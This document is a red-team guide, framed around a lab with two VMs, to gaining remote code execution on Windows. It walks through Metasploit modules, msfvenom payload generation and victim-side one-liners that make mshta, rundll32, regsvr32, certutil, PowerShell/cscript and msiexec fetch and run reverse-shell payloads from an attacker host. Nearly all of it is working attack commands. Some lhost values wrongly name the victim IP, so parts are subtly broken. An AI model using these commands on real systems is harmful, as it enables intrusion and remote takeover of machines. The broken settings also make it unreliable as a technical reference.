# Red Team RCE
# Remote code execution guide for Red Teaming

Note: Attacking machine IP: 192.168.100.42 (Kali/Ubuntu VM)
      Victim machine IP: 192.168.100.14 (Windows 10 Pro VM)

## Malicious hta file:

1. use exploit/windows/misc/hta_server
2. set srvhost 192.168.100.42 //or what the IP of Kali is
3. set lhost 192.168.100.14 //or what the IP of Victim is 
4. set PAYLOAD windows/meterpreter/reverse_http
5. set lhost 192.168.100.14 //or what the IP of Victim is 
6. set LPORT 80 //or any port you want
7. set SessionCommunicationTimeout 0
8. set ExitOnSession false
9. exploit –j

Now metasploit will give you the URL of the malicious hta file, it will be something like:
 - [*] Using URL: http://192.168.100.42/sldfkghlasdfk.hta
If you have chosen a different port (i.e. 1234), it will be like http://192.168.100.42:1234/sldfkghlasdfk.hta

Now, in the victim machine you will run:
 - mshta.exe http://192.168.100.42/sldfkghlasdfk.hta

Hint: Before “exploit -j” run “show options” and if something mandatory is blank, then it should be filled. 

## Malicious dll file:

1. use exploit/windows/smb/smb_delivery
2. set srvhost 192.168.100.42 //or what the IP of Kali is
3. set PAYLOAD windows/meterpreter/reverse_http
4. set lhost 192.168.100.14 //or what the IP of Victim is 
5. set LPORT 80 //or any port you want
6. set SessionCommunicationTimeout 0
7. set ExitOnSession false
8. exploit –j

Now metasploit will give you the command to run, like:
 - msf exploit(windows/smb/smb_delivery) > rundll32.exe \\192.168.100.42\fiWi\test.dll,0
	
Now, in the victim machine you will run:
 - rundll32.exe \\192.168.100.42\fiWi\test.dll,0

Hint: Before “exploit -j” run “show options” and if something mandatory is blank, then it should be filled. 


## Malicious sct file:

1. use exploit/multi/script/web_delivery
2. set target 3 //or “show targets” and choose adequately
3. set PAYLOAD windows/meterpreter/reverse_http
4. set lhost 192.168.100.14 //or what the IP of Victim is 
5. set srvhost 192.168.100.42 //or what the IP of Kali is
6. set LPORT 80 //or any port you want
7. set SessionCommunicationTimeout 0
8. set ExitOnSession false
9. exploit –j

Metasploit will give you the command to run, like:
 - [*] Run the following command on the target machine:
regsvr32 /s /n /u /i:http://192.168.100.42:8080/asdfasdf.sct scrobj.dll

Now, in the victim machine run:
regsvr32 /s /n /u /i:http://192.168.100.42:8080/asdfasdf.sct scrobj.dll

Hint: Before “exploit -j” run “show options” and if something mandatory is blank, then it should be filled. 


## Certutil:

1. msfvenom -p windows/meterpreter/reverse_http lhost=192.168.100.42 lport=4443 -f exe > malware.exe
2. Run apache to serve malware.exe or simpleHTTPServer from python, i.e.:
 - python -m SimpleHTTPServer 80 
 - this should serve http://192.168.100.42/malware.exe
3. use exploit/multi/handler
4. set payload windows/meterpreter/reverse_http
5. set lhost 192.168.100.14
6. set lport 4443
7. set SessionCommunicationTimeout 0
8. set ExitOnSession false
9. exploit –j

On the victim machine run on a command prompt:
 - certutil.exe -urlcache -split -f http://192.168.100.42/malware.exe malware.exe & malware.exe


## Cscript:

1. msfvenom -p cmd/windows/reverse_powershell lhost=192.168.100.42 lport=4443 -f vbs > mal.vbs
2. Run apache to serve mal.vbs or simpleHTTPServer from python, i.e.:
 - python -m SimpleHTTPServer 80 
 - this should serve http://192.168.100.42/mal.vbs
3. use exploit/multi/handler
4. set payload windows/meterpreter/reverse_http
5. set lhost 192.168.100.14
6. set lport 4443
7. set SessionCommunicationTimeout 0
8. set ExitOnSession false
9. exploit –j

Nn the victim machine run:
 - powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.100.42/mal.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""


## Msiexec:

1. msfvenom -p cmd/windows/reverse_powershell lhost=192.168.100.42 lport=8080 -f msi > mal.msi
2. Run apache to serve mal.vbs or simpleHTTPServer from python, i.e.:
 - python -m SimpleHTTPServer 80 
 - this should serve http://192.168.100.42/mal.msi
3. use exploit/multi/handler
4. set payload windows/meterpreter/reverse_http
5. set lhost 192.168.100.14
6. set lport 8080
7. set SessionCommunicationTimeout 0
8. set ExitOnSession false
9. exploit –j

Now on the victim machine ruun:
 - msiexec /q /i http://192.168.100.42/mal.msi

This can also be replicated by generating the .exe from step 1 of certutil and manually packing it as msi using a freeware tool (i.e. msipacker).
